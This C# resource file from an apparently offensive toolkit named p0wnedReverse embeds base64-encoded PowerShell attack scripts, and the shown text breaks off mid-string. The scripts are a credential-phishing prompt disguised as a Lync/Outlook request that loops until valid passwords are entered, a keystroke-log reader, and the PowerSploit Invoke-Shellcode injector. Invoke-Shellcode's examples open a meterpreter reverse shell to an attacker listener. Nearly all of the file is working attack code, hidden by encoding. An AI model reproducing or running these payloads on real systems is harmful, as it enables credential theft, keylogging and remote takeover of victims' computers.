namespace p0wnedReverse
{
    class Resources
    {
        public static string PowerCat()
        {
            string PSPowerCat = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
            return PSPowerCat;
        }
        public static string Invoke_CredentialsPhish()
        {
            string PSInvoke_CredentialsPhish = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"DQpmdW5jdGlvbiBJbnZva2UtQ3JlZGVudGlhbHNQaGlzaA0Kew0KPCMNCi5TWU5PUFNJUw0KTmlzaGFuZyBzY3JpcHQgd2hpY2ggb3BlbnMgYSB1c2VyIGNyZWRlbnRpYWwgcHJvbXB0Lg0KDQouREVTQ1JJUFRJT04NClRoaXMgcGF5bG9hZCBvcGVucyBhIHByb21wdCB3aGljaCBhc2tzIGZvciB1c2VyIGNyZWRlbnRpYWxzIGFuZCBkb2VzIG5vdCBnbyBhd2F5IHRpbGwgdmFsaWQgbG9jYWwgb3IgZG9tYWluIGNyZWRlbnRpYWxzIGFyZSBlbnRlcmVkIGluIHRoZSBwcm9tcHQuDQoNCi5FWEFNUExFDQpQUyA+IEludm9rZS1DcmVkZW50aWFsc1BoaXNoDQoNCi5MSU5LDQpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuYmxvZ3Nwb3QuY29tLw0KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcNCiM+DQoNCltDbWRsZXRCaW5kaW5nKCldDQpQYXJhbSAoKQ0KDQogICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSINCiAgICBBZGQtVHlwZSAtYXNzZW1ibHluYW1lIHN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5hY2NvdW50bWFuYWdlbWVudCANCiAgICAkRFMgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0KFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpNYWNoaW5lKQ0KICAgICRkb21haW5ETiA9ICJMREFQOi8vIiArIChbQURTSV0iIikuZGlzdGluZ3Vpc2hlZE5hbWUNCiAgICB3aGlsZSgkdHJ1ZSkNCiAgICB7DQoJCSRjcmVkZW50aWFsID0gJEhvc3QudWkuUHJvbXB0Rm9yQ3JlZGVudGlhbCgiQ3JlZGVudGlhbHMgYXJlIHJlcXVpcmVkIHRvIHBlcmZvcm0gdGhpcyBvcGVyYXRpb24iLCJMeW5jIG5lZWRzIHlvdXIgdXNlciBuYW1lIGFuZCBwYXNzd29yZCB0byBjb25uZWN0IGZvciByZXRyaWV2aW5nIGNhbGVuZGVyIGRhdGEgZnJvbSBPdXRsb29rLiIsIiRlbnY6dXNlcmRvbWFpblwkZW52OnVzZXJuYW1lIiwiIikNCiAgICAgICAgaWYoJGNyZWRlbnRpYWwpDQogICAgICAgIHsNCiAgICAgICAgICAgICRjcmVkcyA9ICRjcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkNCiAgICAgICAgICAgIFtTdHJpbmddJHVzZXIgPSAkY3JlZHMudXNlcm5hbWUNCiAgICAgICAgICAgIFtTdHJpbmddJHBhc3MgPSAkY3JlZHMucGFzc3dvcmQNCiAgICAgICAgICAgIFtTdHJpbmddJGRvbWFpbiA9ICRjcmVkcy5kb21haW4NCiAgICAgICAgICAgICRhdXRobG9jYWwgPSAkRFMuVmFsaWRhdGVDcmVkZW50aWFscygkdXNlciwgJHBhc3MpDQogICAgICAgICAgICAkYXV0aGRvbWFpbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5KCRkb21haW5ETiwkdXNlciwkcGFzcykNCiAgICAgICAgICAgIGlmKCgkYXV0aGxvY2FsIC1lcSAkdHJ1ZSkgLW9yICgkYXV0aGRvbWFpbi5uYW1lIC1uZSAkbnVsbCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJG91dHB1dCA9ICJVc2VybmFtZTogIiArICR1c2VyICsgIiBQYXNzd29yZDogIiArICRwYXNzICsgIiBEb21haW46IiArICRkb21haW4gKyAiIERvbWFpbjoiKyAkYXV0aGRvbWFpbi5uYW1lDQogICAgICAgICAgICAgICAgJG91dHB1dA0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9"));
            return PSInvoke_CredentialsPhish;
        }
        public static string Get_KeyStrokes()
        {
            string PSInvoke_Get_KeyStrokes = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gR2V0LUtleVN0cm9rZXMNCgl7DQoJZ2V0LWNvbnRlbnQgIiRlbnY6VGVtcFxLZXlMb2ctKiINCgl9"));
            return PSInvoke_Get_KeyStrokes;
        }
        public static string Invoke_Shellcode()
        {
            string PSInvoke_Shellcode = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQ0Kew0KPCMNCi5TWU5PUFNJUw0KDQpJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHByb2Nlc3MgSUQgb2YgeW91ciBjaG9vc2luZyBvciB3aXRoaW4gdGhlIGNvbnRleHQgb2YgdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzLg0KDQpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVNoZWxsY29kZQ0KQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikNCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQ0KUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lDQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUNCiANCi5ERVNDUklQVElPTg0KDQpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlDQoNClBvd2VyU2hlbGwgZXhwZWN0cyBzaGVsbGNvZGUgdG8gYmUgaW4gdGhlIGZvcm0gMHhYWCwweFhYLDB4WFguIFRvIGdlbmVyYXRlIHlvdXIgc2hlbGxjb2RlIGluIHRoaXMgZm9ybSwgeW91IGNhbiB1c2UgdGhpcyBjb21tYW5kIGZyb20gd2l0aGluIEJhY2t0cmFjayAoVGhhbmtzLCBNYXR0IGFuZCBnMHRtMWxrKToNCg0KbXNmcGF5bG9hZCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkIEMgfCBzZWQgJzEsNmQ7cy9bIjtdLy9nO3MvXFwvLDAvZycgfCB0ciAtZCAnXG4nIHwgY3V0IC1jMi0gDQoNCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5Lg0KIA0KLlBBUkFNRVRFUiBQcm9jZXNzSUQNCg0KUHJvY2VzcyBJRCBvZiB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3Qgc2hlbGxjb2RlIGludG8uDQoNCi5QQVJBTUVURVIgU2hlbGxjb2RlDQoNClNwZWNpZmllcyBhbiBvcHRpb25hbCBzaGVsbGNvZGUgcGFzc2VkIGluIGFzIGEgYnl0ZSBhcnJheQ0KDQouUEFSQU1FVEVSIExpc3RNZXRhc3Bsb2l0UGF5bG9hZHMNCg0KTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyB0aGF0IEludm9rZS1TaGVsbGNvZGUgc3VwcG9ydHMNCg0KLlBBUkFNRVRFUiBMaG9zdA0KDQpTcGVjaWZpZXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbA0KDQouUEFSQU1FVEVSIExwb3J0DQogDQpTcGVjaWZpZXMgdGhlIHBvcnQgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbA0KDQouUEFSQU1FVEVSIFBheWxvYWQNCg0KU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IHBheWxvYWQgdG8gdXNlLiBDdXJyZW50bHksIG9ubHkgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJyBhbmQgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycgcGF5bG9hZHMgYXJlIHN1cHBvcnRlZC4NCg0KLlBBUkFNRVRFUiBVc2VyQWdlbnQNCg0KT3B0aW9uYWxseSBzcGVjaWZpZXMgdGhlIHVzZXIgYWdlbnQgdG8gdXNlIHdoZW4gdXNpbmcgbWV0ZXJwcmV0ZXIgaHR0cCBvciBodHRwcyBwYXlsb2Fkcw0KDQouUEFSQU1FVEVSIFByb3h5DQoNCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgcHJveHkgc2V0dGluZ3Mgb24gdGhlIG1hY2hpbmUuDQoNCi5QQVJBTUVURVIgTGVnYWN5DQoNCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgb2xkZXIgbWV0ZXJwcmV0ZXIgaGFuZGxlciAiSU5JVE0iLiBUaGlzIHdpbGwgbGlrZWx5IGJlIHJlbW92ZWQgaW4gdGhlIGZ1dHVyZS4gDQoNCi5QQVJBTUVURVIgRm9yY2UNCg0KSW5qZWN0cyBzaGVsbGNvZGUgd2l0aG91dCBwcm9tcHRpbmcgZm9yIGNvbmZpcm1hdGlvbi4gQnkgZGVmYXVsdCwgSW52b2tlLVNoZWxsY29kZSBwcm9tcHRzIGZvciBjb25maXJtYXRpb24gYmVmb3JlIHBlcmZvcm1pbmcgYW55IG1hbGljaW91cyBhY3QuDQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgNDI3NA0KDQpEZXNjcmlwdGlvbg0KLS0tLS0tLS0tLS0NCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuDQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlDQoNCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLQ0KSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwuDQoNCi5FWEFNUExFDQoNCkM6XFBTPiBTdGFydC1Qcm9jZXNzIEM6XFdpbmRvd3NcU3lzV09XNjRcbm90ZXBhZC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbg0KQzpcUFM+ICRQcm9jID0gR2V0LVByb2Nlc3Mgbm90ZXBhZA0KQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVByb2Nlc3NJZCAkUHJvYy5JZCAtUGF5bG9hZCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMgLUxob3N0IDE5Mi4xNjguMzAuMTI5IC1McG9ydCA0NDMgLVZlcmJvc2UNCg0KVkVSQk9TRTogUmVxdWVzdGluZyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gaHR0cHM6Ly8xOTIuMTY4LjMwLjEyOTo0NDMvSU5JVE0NClZFUkJPU0U6IEluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6IDQwMDQNClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4NClZFUkJPU0U6IFVzaW5nIDMyLWJpdCBzaGVsbGNvZGUuDQpWRVJCT1NFOiBTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDNCRTAwMDANClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuDQpWRVJCT1NFOiBUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweDAwMUIwMDAwDQpWRVJCT1NFOiBTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIQ0KDQpEZXNjcmlwdGlvbg0KLS0tLS0tLS0tLS0NCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoNCg0KUGF5bG9hZCBvcHRpb25zICh3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMpOg0KDQpOYW1lICAgICAgQ3VycmVudCBTZXR0aW5nICBSZXF1aXJlZCAgRGVzY3JpcHRpb24NCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQ0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQ0KTEhPU1QgICAgIDE5Mi4xNjguMzAuMTI5ICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBob3N0bmFtZQ0KTFBPUlQgICAgIDQ0MyAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0DQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1QYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcyAtTGhvc3QgMTkyLjE2OC4zMC4xMjkgLUxwb3J0IDgwDQoNCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLQ0KRXN0YWJsaXNoZXMgYSByZXZlcnNlIGh0dHAgbWV0ZXJwcmV0ZXIgcGF5bG9hZCBmcm9tIHdpdGhpbiB0aGUgcnVubmluZyBQd2VyU2hlbGwgcHJvY2Vzcy4gQSBtdWx0aS1oYW5kbGVyIHdhcyBzZXQgdXAgd2l0aCB0aGUgZm9sbG93aW5nIG9wdGlvbnM6DQoNClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOg0KDQpOYW1lICAgICAgQ3VycmVudCBTZXR0aW5nICBSZXF1aXJlZCAgRGVzY3JpcHRpb24NCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQ0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQ0KTEhPU1QgICAgIDE5Mi4xNjguMzAuMTI5ICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBob3N0bmFtZQ0KTFBPUlQgICAgIDgwICAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0DQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1TaGVsbGNvZGUgQCgweDkwLDB4OTAsMHhDMykNCiAgICANCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLQ0KT3ZlcnJpZGVzIHRoZSBzaGVsbGNvZGUgaW5jbHVkZWQgaW4gdGhlIHNjcmlwdCB3aXRoIGN1c3RvbSBzaGVsbGNvZGUgLSAweDkwIChOT1ApLCAweDkwIChOT1ApLCAweEMzIChSRVQpDQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCENCiAgICANCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1MaXN0TWV0YXNwbG9pdFBheWxvYWRzDQogICAgDQpQYXlsb2Fkcw0KLS0tLS0tLS0NCndpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwDQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMNCg0KLk5PVEVTDQoNClVzZSB0aGUgJy1WZXJib3NlJyBvcHRpb24gdG8gcHJpbnQgZGV0YWlsZWQgaW5mb3JtYXRpb24uDQoNClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyDQoNCkJpZyB0aGFua3MgdG8gT2lzaW4gKHgwbikgR3JlaGFuIChAb2lzaW5nKSBmb3IgYW5zd2VyaW5nIGFsbCBteSBvYnNjdXJlIHF1ZXN0aW9ucyBhdCB0aGUgZHJvcCBvZiBhIGhhdCAtIGh0dHA6Ly93d3cubml2b3Qub3JnLw0KDQouTElOSw0KDQpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQ0KIz4NCg0KW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKA0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldDQogICAgW1VJbnQxNl0NCiAgICAkUHJvY2Vzc0lELA0KICAgIA0KICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnUnVuTG9jYWwnICldDQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0NCiAgICBbQnl0ZVtdXQ0KICAgICRTaGVsbGNvZGUsDQogICAgDQogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQ0KICAgIFtWYWxpZGF0ZVNldCggJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJywNCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLA0KICAgICAgICAgICAgICAgICAgSWdub3JlQ2FzZSA9ICRUcnVlICldDQogICAgW1N0cmluZ10NCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsDQogICAgDQogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdMaXN0UGF5bG9hZHMnICldDQogICAgW1N3aXRjaF0NCiAgICAkTGlzdE1ldGFzcGxvaXRQYXlsb2FkcywNCiAgICANCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwNCiAgICAgICAgICAgICAgICBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldDQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0NCiAgICBbU3RyaW5nXQ0KICAgICRMaG9zdCA9ICcxMjcuMC4wLjEnLA0KICAgIA0KICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLA0KICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0NCiAgICBbVmFsaWRhdGVSYW5nZSggMSw2NTUzNSApXQ0KICAgIFtJbnRdDQogICAgJExwb3J0ID0gODQ0MywNCiAgICANCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldDQogICAgW1ZhbGlkYXRlTm90TnVsbCgpXQ0KICAgIFtTdHJpbmddDQogICAgJFVzZXJBZ2VudCA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLidVc2VyIEFnZW50JywNCg0KICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0NCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldDQogICAgW1N3aXRjaF0NCiAgICAkTGVnYWN5ID0gJEZhbHNlLA0KDQogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQ0KICAgIFtWYWxpZGF0ZU5vdE51bGwoKV0NCiAgICBbU3dpdGNoXQ0KICAgICRQcm94eSA9ICRGYWxzZSwNCiAgICANCiAgICBbU3dpdGNoXQ0KICAgICRGb3JjZSA9ICRGYWxzZQ0KKQ0KDQogICAgU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMi4wDQogICAgDQogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24NCiAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMaXN0UGF5bG9hZHMnKQ0KICAgIHsNCiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BheWxvYWQnXS5BdHRyaWJ1dGVzIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7JF8uVHlwZUlkIC1lcSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5WYWxpZGF0ZVNldEF0dHJpYnV0ZV19DQogICAgDQogICAgICAgIGZvcmVhY2ggKCRQYXlsb2FkIGluICRBdmFpbGFibGVQYXlsb2Fkcy5WYWxpZFZhbHVlcykNCiAgICAgICAgew0KICAgICAgICAgICAgTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsgUGF5bG9hZHMgPSAkUGF5bG9hZCB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFJldHVybg0KICAgIH0NCg0KICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApDQogICAgew0KICAgICAgICAjIEVuc3VyZSBhIHZhbGlkIHByb2Nlc3MgSUQgd2FzIHByb3ZpZGVkDQogICAgICAgICMgVGhpcyBjb3VsZCBoYXZlIGJlZW4gdmFsaWRhdGVkIHZpYSAnVmFsaWRhdGVTY3JpcHQnIGJ1dCB0aGUgZXJyb3IgZ2VuZXJhdGVkIHdpdGggR2V0LVByb2Nlc3MgaXMgbW9yZSBkZXNjcmlwdGl2ZQ0KICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsDQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIExvY2FsOkdldC1EZWxlZ2F0ZVR5cGUNCiAgICB7DQogICAgICAgIFBhcmFtDQogICAgICAgICgNCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldDQogICAgICAgICAgICANCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldDQogICAgICAgICAgICBbVHlwZVtdXQ0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLA0KICAgICAgICAgICAgDQogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0NCiAgICAgICAgICAgIFtUeXBlXQ0KICAgICAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0NCiAgICAgICAgKQ0KDQogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbg0KICAgICAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQ0KICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pDQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkNCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQ0KICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpDQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpDQogICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQ0KICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCiAgICAgICAgDQogICAgICAgIFdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpDQogICAgfQ0KDQogICAgZnVuY3Rpb24gTG9jYWw6R2V0LVByb2NBZGRyZXNzDQogICAgew0KICAgICAgICBQYXJhbQ0KICAgICAgICAoDQogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldDQogICAgICAgIA0KICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQ0KICAgICAgICAgICAgW1N0cmluZ10NCiAgICAgICAgICAgICRNb2R1bGUsDQogICAgICAgICAgICANCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0NCiAgICAgICAgICAgIFtTdHJpbmddDQogICAgICAgICAgICAkUHJvY2VkdXJlDQogICAgICAgICkNCg0KICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMNCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQ0KICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpDQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMNCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykNCiAgICAgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpDQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkDQogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkNCiAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyDQogICAgICAgICRIYW5kbGVSZWYgPSBOZXct